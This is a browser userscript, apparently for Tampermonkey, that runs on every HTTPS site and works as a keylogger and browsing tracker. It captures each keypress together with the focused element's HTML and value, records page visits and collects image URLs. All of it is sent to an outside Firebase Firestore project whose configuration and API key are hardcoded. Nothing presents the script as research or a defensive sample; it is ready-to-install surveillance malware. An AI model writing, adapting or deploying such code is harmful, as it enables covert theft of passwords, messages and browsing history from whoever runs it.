// ==UserScript==
// @name         Key Userscript
// @namespace    http://tampermonkey.net/
// @version      1.0.2
// @description  try to take over the world!
// @author       You
// @match        https://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @require      https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.13.6/underscore-min.js
// @require      https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.7/dayjs.min.js
// @require      https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js
// @require      https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js
//// @require      https://e-grau.github.io/estrella/key.js
// @grant        none
// ==/UserScript==
//uu = "othername";

var uu = "";

(function() {
    'use strict';


    const firebaseConfig = {
        apiKey: "AIzaSyBOj0kF7m-JxxaDYhtlj-xDSu_pLlZOGtI",
        authDomain: "keys-3239e.firebaseapp.com",
        projectId: "keys-3239e",
        storageBucket: "keys-3239e.appspot.com",
        messagingSenderId: "878579812626",
        appId: "1:878579812626:web:d23ba8efa5073f09d70bcb"
    };


    // Initialize Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    const keys$ = db.collection("keys");
    const history$ = db.collection("history");
    const images$ = db.collection("images");

    // Your code here...
    var keys = '';
    const images = [];


    const data = {
        element: "",
        uu: uu || "_ANON_",
        title: document.title,
        url: window.location.href,
        value: "",

    }

    window.onload = function() {

        history$.add(getPageInfo())


    }



    document.onkeypress = function(e) {
        let get = window.event ? event : e;
        data.element = get.target.outerHTML;
        data.value = data.element && data.element.value || "";
        let key_ = get.keyCode ? get.keyCode : get.charCode;
        let key = String.fromCharCode(key_);
        keys += key;

        if (key_ == 13) {
            saveKeys()
        }
    }


    document.onkeyup = _.debounce(saveKeys, 500)

    function saveKeys(e) {
        if (keys.length > 0) {
            //new Image().src = url+keys;
            //data.keys = keys;
            //data.title = document.title;
            // data.url = window.location.href;
            //data.date = new Date();
            //data.day = dayjs().format("YYYY-MM-DD");
            //  data.uu = uu || "_ANON_";
            //   console.log(data);

            keys$.add({
                ...getPageInfo(),
                keys: keys,
            });

            keys = '';
        }

    }

    function getPageInfo() {

        return {
            host: window.location.hostname,
            url: window.location.href,
            date: new Date(),
            day: dayjs().format("YYYY-MM-DD"),
            title: document.title,
            uu: uu || "_ANON_",
        }

    }

    function getImages() {
        let newImages = Array.from(document.querySelectorAll("img")).filter(img => img.src).map(img => img.src).filter((v, i, a) => a.indexOf(v) === i).filter(url => images.indexOf(url) === -1);
        //  console.log("newImages",newImages)
        newImages.forEach(img => images.push(img))
        return newImages;

    }

    function saveImages() {
        const imgs = getImages();
        if (imgs.length) {

            console.log("imagesssssssss", imgs)

            images$.add({
                ...getPageInfo(),
                images: imgs,
                imagesLength: imgs.length,
            })
        }


    }

    setInterval(saveImages, 5000)

})();
